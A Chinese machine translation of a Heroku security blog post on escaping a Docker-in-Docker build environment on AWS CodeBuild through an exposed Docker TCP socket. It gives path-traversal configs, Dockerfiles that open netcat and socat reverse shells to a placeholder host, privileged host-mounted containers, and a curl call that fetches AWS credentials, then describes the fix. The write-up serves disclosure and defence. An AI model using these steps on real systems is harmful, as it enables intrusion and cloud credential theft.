# 纸牌屋:构建 Docker 容器时的安全性探索

> 原文：<https://dev.to/heroku/a-house-of-cards-an-exploration-of-security-when-building-docker-containers--33in>

这篇文章最初出现在 Heroku 的[工程博客](https://blog.heroku.com/engineering)上。

集装箱，尤其是码头工人，风靡一时。大多数 DevOps 设置在 CI 流程中的某个地方都有 Docker。这可能意味着你所看到的任何*构建*环境都将使用 Docker 之类的容器解决方案。这些构建环境需要获取*不可信的*用户提供的代码并执行它。尝试并安全地将其集装箱化以最小化风险是有意义的。

在本帖中，我们将探讨构建环境中的一个小的错误配置是如何造成严重的安全风险的。

值得注意的是，这篇文章并没有描述 Heroku、Docker、AWS CodeBuild 或一般容器中的任何固有漏洞，而是讨论了一个在审查基于 Docker 容器的多租户构建环境时发现的错误配置问题。这些技术提供了开箱即用的非常可靠的安全默认设置，但是当事情开始分层时，有时小的错误配置会导致大的问题。

## 建筑

一个可能的构建环境可能具有以下体系结构:

*   基础设施“托管”的 AWS 代码构建
*   Docker 构建服务中的 Docker 容器

Docker 容器可以通过 [Dind](https://github.com/jpetazzo/dind) 创建，从理论上讲，你最终会得到两个容器，攻击者需要用它们来逃脱。使用 CodeBuild 可以进一步减少攻击面，因为您拥有 AWS 提供的一次性容器，不会有租户与彼此的构建过程交互的危险。

让我们来看看建议的构建过程，更具体地说，攻击者如何能够控制构建过程。

在大多数构建/CI 管道中要做的第一件事是用您希望构建和部署的代码创建一个`git`存储库。这将被打包并传输到构建环境，然后传递到`docker build`流程。

看看构建服务，你通常会发现两种供应容器的方式——通过 *Dockerfile* 或 *config.yml* ，这两种方式都与源代码捆绑在一起。

一个配置项配置文件，姑且称之为 *config-ci.yml* ，可能如下所示:

```
image: ruby:2.1
services:
 - postgres

before_script:
 - bundle install

after_script:
 - rm secrets

stages:
 - build
 - test
 - deploy 
```

Enter fullscreen mode Exit fullscreen mode

然后，在构建的其余部分开始之前，这个文件被构建过程转换成 docker 文件。

在您明确指定要使用的*docker 文件*的情况下，您将 *config-ci.yml* 更改为以下内容:

```
docker:
     web: Dockerfile_Web
     worker: Dockerfile_Worker 
```

Enter fullscreen mode Exit fullscreen mode

其中`Dockerfile_Web`和`Dockerfile_Worker`是源代码库中 docker 文件的相对路径和名称。

既然已经提供了构建信息，就可以开始构建了。构建通常通过源存储库上的`git push`开始。启动后，您会看到类似如下的输出:

```
Counting objects: 22, done.
Delta compression using up to 8 threads.
Compressing objects: 100% (21/21), done.
Writing objects: 100% (22/22), 7.11 KiB | 7.11 MiB/s, done.
Total 22 (delta 11), reused 0 (delta 0)
remote: Compressing source files... done.
remote: Building source:
remote: Downloading application source...
remote: Sending build context to Docker daemon 19.97kB
remote: Step 1/9 : FROM alpine:latest
remote: latest: Pulling from library/alpine
remote: b56ae66c2937: Pulling fs layer
remote: b56ae66c2937: Download complete
remote: b56ae66c2937: Pull complete
remote: Digest: sha256:d6bfc3baf615209a8d607ba2a8103d9c8a405b3bd8741d88b4bef36478
remote: Status: Downloaded newer image for alpine:latest
remote: ---> 053cde6e8953
remote: Step 2/9 : RUN apk add --update --no-cache netcat-openbsd docker 
```

Enter fullscreen mode Exit fullscreen mode

正如您所看到的，我们得到了返回给我们的`docker build -f Dockerfile .`的输出，这对调试很有用，但对发现可能的攻击也很有用。

## 攻击预建

我想到的第一个想法是在我们进入`docker build`步骤之前尝试中断构建过程。或者，我们可以尝试将 CodeBuild 环境中的文件链接到 Docker 构建上下文中。

由于我们控制了 *config-ci.yml* 文件的内容，更具体地说是*“要使用的 docker 文件的相对路径”*，我们可以尝试一种老式的目录遍历攻击。

第一次尝试是简单地尝试并更改用于构建的目录:

```
docker:
   web: ../../../../../ 
```

Enter fullscreen mode Exit fullscreen mode

一旦构建过程开始，我们立即得到以下错误:

```
Error response from daemon: unexpected error reading Dockerfile: read /var/lib/docker/tmp/docker-builder991278373/output: is a directory 
```

Enter fullscreen mode Exit fullscreen mode

有趣的是，我们造成了一个错误，并有一个路径泄漏。如果我们尝试"*读取*一个文件会发生什么？

```
docker:
   web: ../../../../../../../etc/passwd 
```

Enter fullscreen mode Exit fullscreen mode

突然，我们从 Docker 守护进程中发现了解析错误。不幸的是，这只会给我们系统中的第一行文件。尽管如此，这是一个有趣的开始。

```
Error response from daemon: Dockerfile parse error line 1: unknown instruction: ROOT:X:0:0:ROOT:/ROOT:/BIN/BASH
t-
Error response from daemon: Dockerfile parse error line 1: unknown instruction: ROOT:*:17445:0:99999:7::: 
```

Enter fullscreen mode Exit fullscreen mode

另一个想法是尝试使用符号链接将文件包含到我们的构建中。幸运的是，Docker 防止了这种情况，因为它不会将构建目录之外的文件包含到构建上下文中。

## 攻击构建:发现漏洞

是时候回到实际的构建过程，看看我们可以攻击什么了。快速回顾一下:构建过程发生在`dind` Docker 容器中，该容器运行在一次性的 CodeBuild 实例中。为了进一步增加我们的层，`docker build`进程运行一次性 Docker 容器中的所有命令。这是 Docker 的标准费用，Docker 构建的每一步实际上都是一个新的 Docker 容器，从我们构建过程的输出中可以看出这一点。

```
remote: ---> 053cde6e8953
remote: Step 2/9 : RUN apk add --update --no-cache netcat-openbsd docker
remote: ---> Running in e7e10023b1fc 
```

Enter fullscreen mode Exit fullscreen mode

在上面的例子中，步骤 2/9 在新的 Docker 容器 e7e10023b1fc 中执行。因此，即使用户决定在 docker 文件中插入一些恶意代码，它们也应该在一次性的隔离容器中运行，不会造成任何损害。这在下面描述；

@media only 屏幕和
(最小宽度:415px) {
#diagram1 {宽度:70%；}
}

@media only 屏幕和
(max-width: 414px)
(方向:纵向){
# diagram 1 { width:100%；}
}

[![](../Images/9215b076750adc95b34df9ae3bf6ded8.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--9KmBgdwj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://heroku-blog-files.s3.amazonaws.com/posts/1520389661-docker-blog-post-graphics-01.jpg)

当发出 Docker 命令时，这些命令实际上被传递给负责创建/运行/管理 Docker 映像的`dockerd`守护进程。为了让 dind 工作，它需要运行自己的 Docker 守护进程。然而，dind 的实现方式是使用主机系统的 Docker 实例，允许主机和 dind 共享 Docker 映像，并受益于 Docker 所做的所有缓存。

如果用下面的包装脚本启动 Dind 会怎么样:

```
/usr/local/bin/dind dockerd \
   --host=unix:///var/run/docker.sock \
   --host=tcp://0.0.0.0:2375 \
   --storage-driver=overlay &>/var/log/docker.log 
```

Enter fullscreen mode Exit fullscreen mode

其中`/usr/local/bin/dind`只是一个让 Docker 在容器中运行的包装器脚本。

包装器脚本确保来自主机的 Docker 套接字在容器内部可用。这种特定的配置引入了一个安全漏洞。

通常情况下,`docker build`进程没有办法与 Docker 守护进程交互，然而，在这种情况下，我们可以。敏锐的观察者可能会注意到，`dockerd`守护进程的 TCP 端口也是通过`--host=tcp://0.0.0.0:2375`映射的。这种错误配置将 Docker 守护进程设置为监听容器的所有接口。由于 Docker 网络的工作方式，这成为一个问题。除非另有说明，否则所有容器都被放入相同的默认 Docker 网络。这意味着每个容器都能够无障碍地与其他容器进行通信。

现在，在我们的构建过程中，我们的临时构建容器(执行用户代码的容器)能够向托管它的 dind 容器发出网络请求。因为 dind 容器只是重用主机系统的 Docker 守护进程，所以我们实际上直接向主机系统发出命令，AWS CodeBuild。

### 当 Dockerfiles 攻击

为了测试这一点，可以向构建系统提供以下 Dockerfile 文件，允许我们获得对正在构建的容器的交互式访问。这只是允许更快的探索，而不是每次都等待构建过程完成；

```
FROM alpine:latest

RUN apk add --update --no-cache netcat-openbsd docker
RUN mkdir /files
COPY * /files/
RUN mknod /tmp/back p
RUN /bin/sh 0</tmp/back | nc x.x.x.x 4445 1>/tmp/back 
```

Enter fullscreen mode Exit fullscreen mode

是的，反向外壳可以用许多不同的方式来完成。

这个 Dockerfile 安装了几个依赖项，即`docker`和`netcat`。然后，它将源代码目录中的文件复制到构建容器中。这在后面的步骤中是需要的，也使得快速将我们的全部漏洞转移到系统中变得更加容易。`mknod`指令创建一个文件系统节点，允许通过文件重定向标准输入和标准输出。使用`netcat`打开反向外壳。我们还需要在我们用公共 IP 地址控制的系统上为这个反向 shell 设置一个监听器。

```
nc -lv 4445 
```

Enter fullscreen mode Exit fullscreen mode

现在，当构建发生时，将接收到一个反向连接:

```
[ec2-user@ip-172-31-18-217 ~]$ nc -lv 4445
Connection from 34.228.4.217 port 4445 [tcp/upnotifyp] accepted

ls
bin
dev
etc
files
home
lib
media
mnt
proc
root 
```

Enter fullscreen mode Exit fullscreen mode

现在有了远程交互访问，我们可以检查 Docker 守护进程是否可以被访问:

```
docker -H 172.18.0.1 version 
```

Enter fullscreen mode Exit fullscreen mode

我们通过使用`-H 172.18.0.1`来指定*远程*主机。使用这个地址是因为我们发现 Docker 使用的网络范围是`172.18.0.0/16`。为了找到这一点，我们的交互式 shell 被用来执行一个`ip addr`和`ip route`来获得分配给我们的构建容器的网络。记住，默认情况下，所有 Docker 容器都放在同一个网络中。默认网关是 Docker 守护进程正在其上运行的实例。

```
Client:
Version: 17.05.0-ce
API version: 1.29
Go version: go1.8.1
Git commit: v17.05.0-ce
Built: Tue May 16 10:10:15 2017
OS/Arch: linux/amd64

Server:
Version: 17.09.0-ce
API version: 1.32 (minimum version 1.12)
Go version: go1.8.3
Git commit: afdb6d4
Built: Tue Sep 26 22:40:56 2017
OS/Arch: linux/amd64
Experimental: false 
```

Enter fullscreen mode Exit fullscreen mode

成功！此时，我们可以从正在构建的容器中访问 Docker。下一步是启动一个具有额外权限的新容器。

### 叠加起来

我们有一个 shell，但是它在一次性的构建容器中——不是很有用。我们还可以访问 Docker 守护进程。两者结合怎么样？为此，我们引入了第二个 Dockerfile，它在构建和运行时将创建一个反向 shell。我们启动第二个监听器来捕捉新的 shell。

```
FROM alpine:latest

RUN apk add --update --no-cache bash socat
CMD socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:x.x.x.x:4446 
```

Enter fullscreen mode Exit fullscreen mode

这在源代码目录中保存为 Dockerfile2。现在，当源代码文件被复制到构建容器中时，我们可以直接访问它。

当我们重新运行构建过程时，我们将在端口 *4445* 上得到我们的第一个反向 shell，这将我们留在构建容器中。现在我们可以构建 Dockerfile2，它是用`COPY * /files/`复制到我们的构建容器中的；

```
cd files
docker -H 172.18.0.1 build -f Dockerfile2 -t pew . 
```

Enter fullscreen mode Exit fullscreen mode

现在使用主机 Docker 守护程序构建了一个新的 Docker 映像，并且该映像是可用的。我们只需要运行它。这里需要一个额外的技巧，我们需要通过根目录映射到新的 Docker 容器。这可以用`-v /:/vhost`来完成。

在我们的第一个反向 shell 中:

```
docker -H 172.18.0.1 run -d --privileged --net=host -v /:/vhost pew 
```

Enter fullscreen mode Exit fullscreen mode

一个新的反向外壳现在将连接到我们攻击系统的端口 *4446* 。这让我们进入了一个新容器中的 shell，可以直接访问底层 CodeBuild 主机的文件系统和网络。这是因为`--net=host`将映射通过主机网络，而不是将容器保持在一个隔离的网络中。其次，因为 Docker 守护进程运行在主机系统上，所以当使用`-v /:/vhost`的文件映射完成时，主机系统的文件系统被映射通过。

[![](../Images/c964c415a24477fdae5bd2aa63e72d4d.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--nwwQLGfu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://heroku-blog-files.s3.amazonaws.com/posts/1520555459-diagram3-blog-post-graphics-01-v2.jpg)

在新的反向 shell 中，现在可以探索底层的主机文件系统。通过检查`/etc/passwd`和`/vhost/etc/passwd`之间的差异，我们可以证明我们在 Docker 之外与这个文件系统交互。

在里面，我们还发现有一个新的目录，这清楚地表明我们在 CodeBuild 实例文件系统中，而不仅仅是任何 Docker 容器；

```
243e490ebd3:/# cd /vhost/
3243e490ebd3:/vhost# ls
bin dev lib mnt root srv usr
boot etc lib64 opt run sys var
codebuild home media proc sbin tmp 
```

Enter fullscreen mode Exit fullscreen mode

神奇发生在`codebuild`内部。这是 AWS Codebuild 用来控制构建环境的。快速浏览一下，会发现一些有趣的数据。

```
3243e490ebd3:/vhost/codebuild# cat output/tmp/env.sh
export AWS_CONTAINER_CREDENTIALS_RELATIVE_URI='/v2/credentials/e13864de-c2aa-44ab-be11-59137341289d'
export AWS_DEFAULT_REGION='us-east-1'
export AWS_REGION='us-east-1'
export BUILD_ENQUEUED_AT='2017-11-20T15:06:37Z'
export CODEBUILD_AUTH_TOKEN='11111111-2222-3333-4444-555555555555'
export CODEBUILD_BMR_URL='https://CODEBUILD_AGENT:3000'
export CODEBUILD_BUILD_ARN='arn:aws:codebuild:us-east-1:00112233445566:user:11111111-2222-3333-4444-555555555555'
export CODEBUILD_BUILD_ID='111111:11111111-2222-3333-4444-555555555555'
export CODEBUILD_BUILD_IMAGE='codebuild/image'
export CODEBUILD_BUILD_SUCCEEDING='1'
export CODEBUILD_GOPATH='/codebuild/output/src794734460'
export CODEBUILD_INITIATOR='api-client-production'
export CODEBUILD_KMS_KEY_ID='arn:aws:kms:us-east-1:112233445566:alias/aws/s3'
export CODEBUILD_LAST_EXIT='0'
export CODEBUILD_LOG_PATH='0ff0b448-6bed-4af1-8be5-539233fa2e9e'
export CODEBUILD_SOURCE_REPO_URL='builder/builder-source.zip'
export CODEBUILD_SRC_DIR='/codebuild/output/src794734460/src/builder-source.zip'
export DIND_COMMIT='3b5fac462d21ca164b3778647420016315289034'
export DOCKER_VERSION='17.09.0~ce-0~ubuntu'
export GOPATH='/codebuild/output/src794734460'
export HOME='/root'
export HOSTNAME='3243e490ebd3'
... 
```

Enter fullscreen mode Exit fullscreen mode

此时，我们通常会尝试提取 AWS 凭证和 pivot。为此，我们需要使用`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`

```
curl -i http://169.254.170.2/v2/credentials/e13864de-c2aa-44ab-be11-59137341289d

{"RoleArn":"AQIC...",
"AccessKeyId":"ASIA....",
"SecretAccessKey":"uVNs32...",
"Token":"AgoGb3JpZ2luEJP...",
"Expiration":"2017-11-20T16:06:50Z"} 
```

Enter fullscreen mode Exit fullscreen mode

根据与 IAM 相关联的权限，现在应该有机会在 AWS 环境中移动。

上面的步骤可以自动完成，只需要一个逆向 shell，但是，记住你需要保持构建环境*的活力*。这里有一个反向 shell 可以做到这一点，但是一个长时间运行的进程也应该可以做到这一点。最重要的是你不希望初始的`docker build`完成，因为这将启动你的构建环境的拆除。另外，请注意，大多数构建环境往往会在自动拆除之前给你 30-60 分钟的时间。

## 打补丁

在这种情况下，修复非常简单，不要在所有接口上绑定 Docker 守护进程。从包装器脚本中删除行`--host=tcp://0.0.0.0:2375`可以解决这个问题。不需要绑定到 TCP 端口，因为 *unix* 套接字已经通过`--host=unix:///var/run/docker.sock`进行了映射。

## 结论

容器为创建运行不可信代码的安全环境提供了一个很好的机制，而不需要额外的虚拟化。然而，这些容器的安全性取决于它们的配置。默认情况下，它们是非常安全的，但是一个错误的配置就足以毁掉所有的卡。构建环境提供了一个有趣的架构挑战，您总是需要考虑安全层。